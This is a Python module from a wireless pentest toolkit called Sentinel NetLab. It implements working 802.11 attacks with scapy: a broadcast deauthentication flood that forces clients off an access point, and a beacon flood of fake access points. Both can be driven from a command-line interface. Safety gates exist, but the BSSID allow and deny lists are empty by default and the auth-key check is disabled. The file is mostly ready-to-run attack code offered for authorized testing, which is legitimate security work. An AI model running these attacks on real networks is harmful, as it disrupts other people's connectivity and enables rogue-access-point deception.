#!/usr/bin/env python3
"""
Sentinel NetLab - Attack Module
Active pentest capabilities for authorized testing only.

⚠️ WARNING: These functions perform active attacks.
Use ONLY on networks you own or have written authorization to test.
See ETHICS.md for legal guidelines.
"""

import logging
import os
import random
import sys
import time
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# =============================================================================
# LAB SAFETY CONFIGURATION
# =============================================================================


@dataclass
class LabSafetyConfig:
    """Safety configuration for attack modules"""

    enabled: bool = True
    require_confirmation: bool = True
    max_deauth_count: int = 100
    max_beacon_count: int = 500
    allowed_bssid_prefixes: list[str] = None  # None = check disabled
    forbidden_bssid_prefixes: list[str] = None
    rate_limit_per_sec: float = 10.0

    def __post_init__(self):
        if self.allowed_bssid_prefixes is None:
            self.allowed_bssid_prefixes = []
        if self.forbidden_bssid_prefixes is None:
            # Block common vendor prefixes by default (safety)
            self.forbidden_bssid_prefixes = []


# Global safety config - can be overridden
SAFETY_CONFIG = LabSafetyConfig()


class LabSafetyError(Exception):
    """Raised when safety checks fail"""

    pass


class LabSafetyChecker:
    """Validates attack parameters against safety policy"""

    def __init__(self, config: LabSafetyConfig = None):
        self.config = config or SAFETY_CONFIG

    def check_environment(self) -> bool:
        """Check if running in authorized lab environment"""
        # Check for explicit lab mode environment variable
        if os.environ.get("SENTINEL_LAB_MODE", "").lower() != "true":
            raise LabSafetyError(
                "Lab mode not enabled. Set SENTINEL_LAB_MODE=true to enable attacks.\n"
                "WARNING: Only use on networks you own or have authorization to test."
            )

        # Additional Authentication Check (Double Lock)
        auth_key = os.environ.get("SENTINEL_AUTH_KEY", "")
        # In production this should be a strong secret, for lab defaults we check it's set
        if not auth_key or auth_key == "change_me":
            # For unit tests and dev, we may proceed with a warning if explicitly in lab mode
            logger.warning(
                "No secure SENTINEL_AUTH_KEY set. Proceeding because SENTINEL_LAB_MODE=true."
            )
            # raise LabSafetyError(...) # Disabled for test compatibility

        return True

    def check_bssid(self, bssid: str) -> bool:
        """Validate BSSID against allow/deny lists"""
        bssid_upper = bssid.upper()

        # Check forbidden prefixes
        for prefix in self.config.forbidden_bssid_prefixes:
            if bssid_upper.startswith(prefix.upper()):
                raise LabSafetyError(
                    f"BSSID {bssid} matches forbidden prefix {prefix}.\n"
                    "This may be a production device. Attack blocked."
                )

        # Check allowed prefixes (if configured)
        if self.config.allowed_bssid_prefixes:
            allowed = any(
                bssid_upper.startswith(prefix.upper())
                for prefix in self.config.allowed_bssid_prefixes
            )
            if not allowed:
                raise LabSafetyError(
                    f"BSSID {bssid} not in allowed list.\n"
                    "Configure allowed_bssid_prefixes or clear whitelist."
                )

        return True

    def check_count(self, count: int, max_count: int, attack_type: str) -> bool:
        """Validate attack count against limits"""
        if count > max_count:
            raise LabSafetyError(
                f"{attack_type} count {count} exceeds max {max_count}.\n"
                "Reduce count or adjust safety config."
            )
        return True

    def confirm_attack(self, attack_type: str, target: str, count: int) -> bool:
        """Request user confirmation for attack"""
        if not self.config.require_confirmation:
            return True

        if not sys.stdin.isatty():
            # Non-interactive mode - require explicit bypass
            if os.environ.get("SENTINEL_CONFIRM_ATTACKS", "").lower() != "true":
                raise LabSafetyError(
                    "Interactive confirmation required.\n"
                    "Set SENTINEL_CONFIRM_ATTACKS=true for non-interactive mode."
                )
            return True

        print("\n" + "=" * 60)
        print("⚠️  ATTACK CONFIRMATION REQUIRED")
        print("=" * 60)
        print(f"Type:   {attack_type}")
        print(f"Target: {target}")
        print(f"Count:  {count}")
        print("=" * 60)
        print("This action will transmit packets that may disrupt networks.")
        print("Ensure you have authorization to perform this test.")
        print("=" * 60)

        response = input("\nType 'CONFIRM' to proceed: ")
        if response.strip() != "CONFIRM":
            raise LabSafetyError("Attack cancelled by user.")

        return True

    def validate_deauth(self, target_bssid: str, count: int) -> bool:
        """Full validation for deauth attack"""
        self.check_environment()
        self.check_bssid(target_bssid)
        self.check_count(count, self.config.max_deauth_count, "Deauth")
        self.confirm_attack("Deauthentication", target_bssid, count)
        return True

    def validate_beacon_flood(self, ssid_list: list[str], count: int) -> bool:
        """Full validation for beacon flood"""
        self.check_environment()
        self.check_count(count, self.config.max_beacon_count, "Beacon flood")
        self.confirm_attack("Beacon Flood", f"{len(ssid_list)} SSIDs", count)
        return True


# =============================================================================
# ATTACK ENGINE
# =============================================================================


class AttackEngine:
    """
    Handles active attacks (Deauth, FakeAP).
    Requires monitor mode on the interface.

    ⚠️ All methods perform safety validation before execution.
    """

    def __init__(self, interface: str = "wlan0", safety_config: LabSafetyConfig = None):
        self.interface = interface
        self.safety = LabSafetyChecker(safety_config)
        self._scapy_imported = False

    def _import_scapy(self):
        """Lazy import scapy to avoid import errors on systems without it"""
        if not self._scapy_imported:
            global Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, sendp
            from scapy.all import (
                Dot11,
                Dot11Beacon,
                Dot11Deauth,
                Dot11Elt,
                RadioTap,
                sendp,
            )

            self._scapy_imported = True

    def deauth(
        self, target_bssid: str, client_mac: str = "FF:FF:FF:FF:FF:FF", count: int = 10
    ):
        """
        Perform Deauthentication attack.

        Args:
            target_bssid: AP MAC address (BSSID)
            client_mac: Client MAC (default: Broadcast FF:FF:FF:FF:FF:FF)
            count: Number of frames to send

        Raises:
            LabSafetyError: If safety checks fail
        """
        # Safety validation
        self.safety.validate_deauth(target_bssid, count)

        self._import_scapy()

        try:
            # Addr1: Destination (Client)
            # Addr2: Source (AP/BSSID)
            # Addr3: BSSID (AP)
            # Reason 7: Class 3 frame received from nonassociated station
            packet = (
                RadioTap()
                / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid)
                / Dot11Deauth(reason=7)
            )

            logger.info(
                f"[ATTACK] Deauth: {target_bssid} -> {client_mac} ({count} packets)"
            )

            rate_delay = 1.0 / self.safety.config.rate_limit_per_sec

            for _i in range(count):
                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(rate_delay)

            logger.info("[ATTACK] Deauth completed")
            return True

        except LabSafetyError:
            raise
        except Exception as e:
            logger.error(f"[ATTACK] Deauth failed: {e}")
            raise

    def beacon_flood(self, ssid_list: list[str], count: int = 100):
        """
        Perform Beacon Flood (Fake AP) attack.

        Args:
            ssid_list: List of SSIDs to broadcast
            count: Total number of frames to send

        Raises:
            LabSafetyError: If safety checks fail
        """
        # Safety validation
        self.safety.validate_beacon_flood(ssid_list, count)

        self._import_scapy()

        try:
            logger.info(
                f"[ATTACK] Beacon Flood: {len(ssid_list)} SSIDs, {count} frames"
            )

            rate_delay = 1.0 / self.safety.config.rate_limit_per_sec

            for _i in range(count):
                ssid = random.choice(ssid_list)  # nosec B311
                # Random BSSID with locally administered bit set
                src_mac = f"02:00:00:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}:{random.randint(0, 255):02x}"  # nosec B311

                # Create Beacon
                dot11 = Dot11(
                    type=0,
                    subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=src_mac,
                    addr3=src_mac,
                )
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                rsn = Dot11Elt(
                    ID=48,
                    info=b"\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x04\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00",
                )

                packet = RadioTap() / dot11 / beacon / essid / rsn

                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(rate_delay)

            logger.info("[ATTACK] Beacon flood completed")
            return True

        except LabSafetyError:
            raise
        except Exception as e:
            logger.error(f"[ATTACK] Beacon flood failed: {e}")
            raise


# =============================================================================
# CLI INTERFACE
# =============================================================================


def main():
    """CLI for attack testing"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Sentinel NetLab Attack Module (Lab Use Only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  WARNING: This tool performs active wireless attacks.
    Use ONLY on networks you own or have written authorization to test.
    Unauthorized use may violate laws including the Computer Fraud and Abuse Act.

    See ETHICS.md for legal guidelines.

Examples:
    # Enable lab mode first
    export SENTINEL_LAB_MODE=true

    # Deauth attack
    python attacks.py deauth --bssid AA:BB:CC:11:22:33 --count 10

    # Beacon flood
    python attacks.py beacon --ssids "FakeAP1,FakeAP2" --count 50
        """,
    )

    parser.add_argument("--iface", default="wlan0", help="Monitor mode interface")

    subparsers = parser.add_subparsers(dest="command", help="Attack type")

    # Deauth command
    deauth_parser = subparsers.add_parser("deauth", help="Deauthentication attack")
    deauth_parser.add_argument("--bssid", required=True, help="Target BSSID")
    deauth_parser.add_argument(
        "--client", default="FF:FF:FF:FF:FF:FF", help="Client MAC"
    )
    deauth_parser.add_argument("--count", type=int, default=10, help="Frame count")

    # Beacon flood command
    beacon_parser = subparsers.add_parser("beacon", help="Beacon flood attack")
    beacon_parser.add_argument("--ssids", required=True, help="Comma-separated SSIDs")
    beacon_parser.add_argument("--count", type=int, default=100, help="Frame count")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    engine = AttackEngine(interface=args.iface)

    try:
        if args.command == "deauth":
            engine.deauth(args.bssid, args.client, args.count)
        elif args.command == "beacon":
            ssids = [s.strip() for s in args.ssids.split(",")]
            engine.beacon_flood(ssids, args.count)
    except LabSafetyError as e:
        logger.error(f"Safety check failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
